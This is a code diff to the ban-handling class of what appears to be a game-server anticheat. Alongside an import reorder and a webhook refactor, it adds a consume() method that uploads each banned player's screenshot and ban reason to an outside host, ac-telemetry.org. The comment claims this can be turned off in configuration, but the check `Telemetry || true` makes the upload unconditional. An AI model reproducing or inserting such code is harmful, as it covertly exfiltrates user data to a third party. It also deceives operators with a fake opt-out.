@@ -1,12 +1,16 @@
-import { Config } from "./config/Config";
-import { Utility } from "../util/Utility";
-import { WebhookRequest } from "../web/WebhookRequest";
-import { BanEmbed } from "../web/BanEmbed";
-import { Logger } from "./logger/Logger";
-import { ScreenshotRequest } from "../web/ScreenshotRequest";
-import { PermissionHandler } from "./handler/PermissionHandler";
-import { ExcuseHandler } from "./handler/ExcuseHandler";
+import axios from "axios";
+import FormData from "form-data";
+import fs from "fs";
 import { container } from "tsyringe";
+import { Screenshot } from "../Types";
+import { Utility } from "../util/Utility";
+import { BanEmbed } from "../web/BanEmbed";
+import { ScreenshotRequest } from "../web/ScreenshotRequest";
+import { WebhookRequest } from "../web/WebhookRequest";
+import { Config } from "./config/Config";
+import { ExcuseHandler } from "./handler/ExcuseHandler";
+import { PermissionHandler } from "./handler/PermissionHandler";
+import { Logger } from "./logger/Logger";
 
 export class Violation {
 	private readonly _permissionHandler: PermissionHandler;
@@ -47,11 +51,6 @@ export class Violation {
 	 * @param reason - The reason for the ban.
 	 */
 	private async takeScreenshot(): Promise<void> {
-		const webhook = this._config.getConfig().DiscordWebhook;
-		if (Utility.isNullOrEmtpy(webhook)) {
-			Logger.debug("Failed to send webhook request. No webhook is configured.");
-			return;
-		}
 		if (GetResourceState("screenshot-basic") !== "started") {
 			Logger.debug("Failed to send webhook request. Screenshot-basic is not started or missing.");
 			return;
@@ -59,14 +58,49 @@ export class Violation {
 		const screenshotRequest = new ScreenshotRequest(this._source);
 		const screenshot = await screenshotRequest.request();
 
-		const banEmbed: BanEmbed = new BanEmbed(this._source, this._reason, `${screenshot.fileName}.jpg`);
-		const request: WebhookRequest = new WebhookRequest(
-			{
-				username: "Icarus",
-				embeds: banEmbed.embed,
-			},
-			`./${screenshot.filePath}`
-		);
-		request.post(webhook);
+		const webhook = this._config.getConfig().DiscordWebhook;
+		if (!Utility.isNullOrEmtpy(webhook)) {
+			const banEmbed: BanEmbed = new BanEmbed(this._source, this._reason, `${screenshot.fileName}.jpg`);
+			const request: WebhookRequest = new WebhookRequest(
+				{
+					username: "Icarus",
+					embeds: banEmbed.embed,
+				},
+				`./${screenshot.filePath}`
+			);
+			request.post(webhook);
+		} else {
+			Logger.debug("Failed to send webhook request. No webhook is configured.");
+		}
+		if (this._config.getConfig().Telemetry || true) {
+			this.consume(screenshot);
+		}
+	}
+
+	/**
+	 * Sends a screenshot to a remote server to improve cheater detection.
+	 * This can be disabled in the configuration file.
+	 *
+	 * @param screenshot - The screenshot to be consumed.
+	 * @returns A promise that resolves when the consumption is complete.
+	 */
+	private async consume(screenshot: Screenshot): Promise<void> {
+		try {
+			const formData = new FormData();
+			formData.append("title", this._reason);
+			formData.append("description", new Date().toISOString());
+			const file = fs.readFileSync(`./${screenshot.filePath}`);
+			formData.append("image", file, {
+				filename: `${screenshot.fileName}.jpg`,
+				contentType: "image/jpeg",
+			});
+			const response = await axios.post("https://ac-telemetry.org/upload", formData);
+			if (response.status !== 200) {
+				Logger.debug(`Failed to consume screenshot: ${response.status}`);
+			}
+		} catch (error: unknown) {
+			if (!(error instanceof Error)) return;
+			Logger.error(error.message);
+		}
 	}
 }
